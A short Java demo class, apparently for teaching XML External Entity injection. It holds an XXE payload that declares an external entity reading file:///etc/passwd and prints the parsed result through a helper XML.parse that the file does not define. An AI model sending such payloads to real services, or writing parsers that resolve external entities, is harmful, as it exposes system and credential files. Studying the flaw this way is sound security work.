import org.w3c.dom.Document;

public class XXEDemo {
  static String xxe = "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>" +
                      "<foo>&xxe;</foo>";

  public static void main(String[] args) throws Exception {
    Document doc = XML.parse(xxe);
    System.out.println(doc.getDocumentElement().getTextContent());
  }
}
